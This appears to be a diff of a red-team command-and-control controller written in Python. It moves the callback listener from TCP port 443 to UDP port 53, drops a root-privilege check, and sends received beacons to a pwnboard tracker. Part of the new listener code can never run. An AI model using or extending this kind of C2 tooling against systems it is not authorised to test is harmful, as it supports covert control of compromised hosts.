@@ -45,9 +45,6 @@ groupparams = {
 def main():
     print_banner()
 
-    if os.geteuid() != 0:
-        print(colored("[!] You are running without escalated privileges. This might cause errors.\n", "yellow"))
-
     handle_args.setup_args()
     handle_interactive.interactive_main()
 
@@ -60,18 +57,18 @@ def updatePwnboard(ip, mode):
         print(E)
 
 def pgListen(params):
-    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    soc.bind((params["LHOST"], 443))
+    soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    soc.bind((params["LHOST"], 53))
+    soc.settimeout(15)
 
-    soc.listen(9)
-
-    conn, addr = soc.accept()
-    print(addr[0], addr[1])
     while True:
-        data = conn.recv(1024)
-        if not data:
-            break
+        data,addr = soc.recvfrom(1024)
+    # strip data
         print(data)
+    data = str(data)
+
+    if baseparams["PWNBOARD"] is not None:
+        updatePwnboard(data, "cmd")
 
 
 def shListen(params):
@@ -263,10 +260,10 @@ def executeGroup():
 
 def executePing():
     if baseparams["MODE"] == "CMD" and verify(cmdparams):
-        plaintext = "FC-PG-192.168.10.174\00"
+        plaintext = "FC-PG-192.168.10.171\00"
         t = multiprocessing.Process(target=pgListen, args=(cmdparams,))
         t.start()
-        # time.sleep(2)
+        time.sleep(3)
         execute(plaintext, cmdparams)
         t.join()
     elif baseparams["MODE"] == "GROUP" and verify(groupparams):
